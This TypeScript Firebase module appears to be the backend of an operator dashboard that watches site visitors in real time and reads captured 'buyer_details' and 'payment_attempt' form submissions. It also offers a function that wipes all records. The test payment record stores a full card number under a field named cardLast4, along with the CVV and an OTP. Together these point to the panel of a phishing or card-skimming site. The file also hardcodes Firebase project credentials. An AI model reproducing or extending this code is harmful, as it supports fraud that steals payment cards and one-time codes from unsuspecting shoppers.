import { initializeApp, getApps, getApp, type FirebaseApp } from "firebase/app"
import { getDatabase, ref, onValue, remove, push, set, type Database } from "firebase/database"
import { getAuth, type Auth } from "firebase/auth"

const firebaseConfig = {
  apiKey: "AIzaSyDgFnMZD4NHBPe6cAT1CtL1amIBqmaKzEU",
  authDomain: "ziolm-16b34.firebaseapp.com",
  databaseURL: "https://ziolm-16b34-default-rtdb.firebaseio.com",
  projectId: "ziolm-16b34",
  storageBucket: "ziolm-16b34.firebasestorage.app",
  messagingSenderId: "669950264738",
  appId: "1:669950264738:web:b18d8aae90b7e048c3defb",
  measurementId: "G-XVP5TC5KKQ",
}

let app: FirebaseApp | null = null
let db: Database | null = null
let auth: Auth | null = null

if (typeof window !== "undefined") {
  app = getApps().length === 0 ? initializeApp(firebaseConfig) : getApp()
  db = getDatabase(app)
  auth = getAuth(app)
}

export { auth }

function getDB() {
  if (!db) {
    throw new Error("Database not initialized. Make sure you're on the client side.")
  }
  return db
}

export interface VisitorData {
  visitorId: string
  country: string
  city: string
  isOnline: boolean
  currentPage: string
  lastSeen: number
}

export interface FormSubmission {
  id: string
  visitorId: string
  formType: "buyer_details" | "payment_attempt"
  data: Record<string, any>
  success: boolean
  timestamp: number
}

export function subscribeToVisitors(callback: (data: VisitorData[]) => void) {
  const visitorsRef = ref(getDB(), "visitors")

  return onValue(visitorsRef, (snapshot) => {
    const visitors: VisitorData[] = []
    const data = snapshot.val()

    if (data) {
      Object.entries(data).forEach(([id, value]: [string, any]) => {
        visitors.push({
          visitorId: id,
          country: value.country || "",
          city: value.city || "",
          isOnline: value.isOnline || false,
          currentPage: value.currentPage || "",
          lastSeen: value.lastSeen || Date.now(),
        })
      })

      // Sort by lastSeen descending
      visitors.sort((a, b) => b.lastSeen - a.lastSeen)
    }

    callback(visitors)
  })
}

export function subscribeToFormSubmissions(callback: (data: FormSubmission[]) => void) {
  const formsRef = ref(getDB(), "form_submissions")

  return onValue(formsRef, (snapshot) => {
    const submissions: FormSubmission[] = []
    const data = snapshot.val()

    if (data) {
      Object.entries(data).forEach(([id, value]: [string, any]) => {
        submissions.push({
          id,
          visitorId: value.visitorId || "",
          formType: value.formType || "buyer_details",
          data: value.data || {},
          success: value.success || false,
          timestamp: value.timestamp || Date.now(),
        })
      })

      // Sort by timestamp descending
      submissions.sort((a, b) => b.timestamp - a.timestamp)
    }

    callback(submissions)
  })
}

export function getOnlineVisitorsCount(callback: (count: number) => void) {
  const visitorsRef = ref(getDB(), "visitors")

  return onValue(visitorsRef, (snapshot) => {
    let count = 0
    const data = snapshot.val()

    if (data) {
      Object.values(data).forEach((visitor: any) => {
        if (visitor.isOnline) count++
      })
    }

    callback(count)
  })
}

export async function deleteAllData() {
  try {
    // Delete all visitors
    const visitorsRef = ref(getDB(), "visitors")
    await remove(visitorsRef)

    // Delete all form submissions
    const formsRef = ref(getDB(), "form_submissions")
    await remove(formsRef)

    return { success: true }
  } catch (error) {
    console.error("Error deleting data:", error)
    return { success: false, error }
  }
}

export async function addTestVisitor() {
  const visitorsRef = ref(getDB(), "visitors")
  const newVisitorRef = push(visitorsRef)

  await set(newVisitorRef, {
    country: "United States",
    city: "New York",
    isOnline: true,
    currentPage: "/",
    lastSeen: Date.now(),
  })

  return newVisitorRef.key
}

export async function addTestFormSubmission(visitorId: string, formType: "buyer_details" | "payment_attempt") {
  const formsRef = ref(getDB(), "form_submissions")
  const newFormRef = push(formsRef)

  const testData =
    formType === "buyer_details"
      ? {
          fullName: "John Doe",
          phone: "+1234567890",
          email: "john@example.com",
          address: "123 Main St",
        }
      : {
          cardholderName: "JOHN DOE",
          cardLast4: "4532 1234 5678 9010",
          expiryDate: "12/25",
          cvv: "123",
          otp: "123456",
        }

  await set(newFormRef, {
    visitorId,
    formType,
    data: testData,
    success: formType === "payment_attempt",
    timestamp: Date.now(),
  })

  return newFormRef.key
}
